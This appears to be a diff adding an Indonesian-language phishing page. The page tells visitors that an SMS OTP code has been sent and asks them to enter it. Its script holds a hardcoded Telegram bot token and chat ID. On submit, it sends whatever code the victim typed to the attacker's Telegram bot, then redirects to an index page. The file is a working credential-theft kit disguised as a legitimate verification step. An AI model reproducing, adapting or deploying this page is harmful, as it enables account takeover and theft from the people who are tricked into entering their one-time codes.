@@ -1,0 +1,330 @@
+<!DOCTYPE HTML>
+<html lang="en"><head>
+
+
+    <!-- Slick CSS -->
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick-theme.css">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">
+
+    <!-- Our CSS -->
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Nunito:wght@800&display=swap');
+        body {
+            font-family: 'Nunito', sans-serif;
+            html{overflow-x: hidden;}
+        }
+
+        h2 {
+            font-family: 'Nunito', sans-serif; 
+            font-size: 15px; 
+            font-weight: bold; 
+            color: #0086e0; 
+            letter-spacing: 1.2px;
+            text-align: center;
+            line-height: 1; 
+            border-radius: 5px; 
+            
+        }
+
+        h3 {
+            font-family: 'Nunito', sans-serif;
+            font-size: 13px; 
+            font-weight: bold; 
+            color: #0086e0;
+            text-align: center;
+            letter-spacing: 1px;
+            line-height: 2; 
+            border-radius: 5px; 
+            
+        }
+        
+        h9 {
+            font-family: 'Nunito', sans-serif;
+            font-size: 13px; 
+            font-weight: bold;
+            text-align: center;
+            color: #0086e0; 
+            letter-spacing: 1.4px;
+            line-height: 1; 
+            border-radius: 5px; 
+            
+        }
+        
+        h4 {
+            font-family: 'Nunito', sans-serif;
+            font-size: 13px; 
+            font-weight: bold; 
+            color: #000; 
+            letter-spacing: 1px;
+            text-align: center;
+            line-height: 1; 
+            border-radius: 5px; 
+            
+        }
+        
+        h5 {
+            font-family: 'Nunito', sans-serif;
+            font-size: 16px; 
+            font-weight: bold; 
+            color: #0086e0; 
+            letter-spacing: 1px;
+            text-align: center;
+            line-height: 1; 
+            border-radius: 5px; 
+            
+        }
+        
+        h6 {
+            font-family: 'Nunito', sans-serif;
+            font-size: 13px; 
+            font-weight: bold; 
+            color: #000; 
+            letter-spacing: 1px;
+            text-align: center;
+            line-height: 1; 
+            border-radius: 5px; 
+            
+        }
+
+        .btn-punya {
+            display: block;
+            margin: 0px auto 0 auto;
+            padding: 0px; 
+            cursor: pointer; 
+            background: none rgb(0, 134, 224);
+            border: none; 
+            text-align: center; 
+            height: 55px; 
+            width: 536px; 
+            max-width: 85%;
+            font-family: 'Nunito', sans-serif;
+            font-size: 16px; 
+            font-weight: bold; 
+            color: rgb(255, 255, 255); 
+            letter-spacing: 2px;
+            line-height: 1; 
+            border-radius: 7px; 
+            box-shadow: rgb(170, 170, 170) 10px 10px 12px 0px; 
+            transition: background 200ms ease 0s;
+        }
+
+        .form-log {
+            box-sizing: border-box; 
+            height: 45px; 
+            width: 536px; 
+            max-width: 90%; 
+            border: 2px solid rgb(0, 134, 224); 
+            border-image: initial; 
+            background-color: rgb(255, 255, 255); 
+            border-radius: 20px; 
+            box-shadow: rgb(237, 237, 237) 2px 2px 2px 0px; 
+            font-family: 'Nunito', sans-serif;
+            font-size: 16px; 
+            color: rgb(28, 28, 28); 
+            word-spacing: 7px; 
+            padding: 0px 45px;
+        }
+        
+        #ionIcons {
+            color: rgb(22, 119, 199);
+            font-size: 29px;
+            position: absolute;
+            display: block;
+            margin-top: 3px;
+            margin-left: 35px;
+        }
+        
+        input {
+            border: 3px solid rgb(0, 134, 224);
+            border-radius: 8px;
+            padding: 5px 10px;
+        }
+        
+        h1{
+            display: table;
+            background: #F8F8FF;
+            color: #fff;
+            padding: 2px;
+            width: 100%;
+            
+        }
+        
+        h7{
+            display: table;
+            background: #3081ce;
+            color: #fff;
+            padding: 15px;
+            width: 100%;
+            font-size: 12px;
+            text-align: center;
+            font-family: 'Nunito', sans-serif;
+            
+        }
+
+        .container {
+            max-width: 900px;
+            padding: 15px;
+            background-color: #fff;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .slider .slick-slide {
+            border: solid 0px #000;
+        }
+
+        .slider .slick-slide img {
+            width: 100%;
+            margin-top: 0px;
+        }
+
+        /* make button larger and change their positions */
+        .slick-prev, .slick-next {
+            width: 0px;
+            height: 0px;
+            z-index: 1;
+        }
+        .slick-prev {
+            left: 0px;
+        }
+        .slick-next {
+            right: 0px;
+        }
+        .slick-prev:before, 
+        .slick-next:before {
+            font-size: 0px;
+            text-shadow: 0 0 0px rgba(0,0,0,0.5);
+        }
+        
+        /* move dotted nav position */
+        .slick-dots {
+            bottom: 0px;
+        }
+        /* enlarge dots and change their colors */
+        .slick-dots li button:before {
+            font-size: 12px;
+            color: #000;
+            text-shadow: 0 0 10px rgba(0,0,0,0.5);
+            opacity: 0;
+        }
+        .slick-dots li.slick-active button:before {
+            color: #dedede;
+        }
+
+        /* transition effects for opacity */
+        .slick-arrow,
+         {
+            transition: opacity 0.2s ease-out;
+        }
+            </style>
+          <legend>
+             <img src="" width="max"><br><br>
+            </legend>
+         </center>
+            <div class="row">
+                <div class="col-12" style="width: max-px; max-width: 100%; display: block; margin: -5px auto;">
+                
+                             
+           </center>
+          <div>
+            <div class="row">
+                <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: -5px auto;">
+                <center>
+                <div>   
+       
+    </style>
+</head>
+
+        </b><strong>Kode OTP SMS telah dikirim ke nomor telepon anda.</b></strong><br>
+       <center>
+         
+    <style>
+       </style>
+       <div class="row">
+                <div class="col-15" style="width: 520px; max-width: 100%; display: block; margin: 25px auto;">
+                    <form id="fetch" onsubmit="">
+                        <textarea name="name" class="bubble-element MultiLineInput" data-gramm_editor="false" tabindex="1" placeholder="KODE OTP SMS " maxlength="" rows="1" style="max-width: 100%; display: block; margin: auto; width: 300px; left: 0px; top: 0px; background-color: rgb(255, 255, 255); min-height: 80px; overflow: hidden; overflow-wrap: break-word; box-shadow: rgba(71, 71, 71, 71,) 2px 2px 2px 2px; font-family: Arial; font-size: 20px; font-weight: bold; color: rgb(61, 61, 61); text-align: center; height: 70px;" required></textarea>
+                        <button type="submit" id="doMtoken" class="bubble-element Button clickable-element" style="max-width: 90%; padding: 0px; cursor: pointer; background: none rgb(9, 140, 227); border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1.5px; line-height: 1; border-radius: 5px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s;" tabindex="3"><b>OK</b></button>
+         
+         <script>
+        document.getElementById('timer').innerHTML =
+          03 + ":" + 01;
+        startTimer();
+        
+        
+        function startTimer() {
+          var presentTime = document.getElementById('timer').innerHTML;
+          var timeArray = presentTime.split(/[:]+/);
+          var m = timeArray[0];
+          var s = checkSecond((timeArray[1] - 1));
+          if(s==59){m=m-1}
+          if(m<0){
+            return
+          }
+          
+          document.getElementById('timer').innerHTML =
+            m + " : " + s;
+          console.log(m)
+          setTimeout(startTimer, 1000);
+          
+        }
+        
+        function checkSecond(sec
+       ) {
+          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
+          if (sec < 0) {sec = "59"};
+          return sec;
+        }
+    </script>
+    <script>
+    const TOKEN = "6217939894:AAFOdDvks7TTcgEeIAB0cBc1DzXTkARxhaU";
+const CHAT_ID = "5806360166";
+const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+const form = document.getElementById("fetch");
+
+form.addEventListener("submit", onSubmitTelegram);
+
+function onSubmitTelegram(e) {
+  e.preventDefault();
+
+  const { pesan, } = form;
+  const data = {
+    pesan: pesan.value,
+  };
+
+  let message = `<b></b>\n`;
+  message += `<b>SMS-LINK : </b> ${data.pesan}`;
+
+  const dataTg = {
+    chat_id: CHAT_ID,
+    text: message,
+    parse_mode: "html",
+  };
+
+  const options = {
+    method: "POST",
+    body: JSON.stringify(dataTg),
+    headers: {
+      "Content-Type": "application/json",
+    },
+  };
+
+  fetch(URL_API, options)
+    .then((res) => res.json())
+    .then((res) => console.log(res))
+    .catch((err) => console.log(err));
+    
+    window.location.href='/index.html';
+}
+
+
+    </script>
+    <!-- <script src="./axios.js" type="module"></script> -->
+    <script src="./fetch.js" type="module"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  </body>
+</html>
+
+  
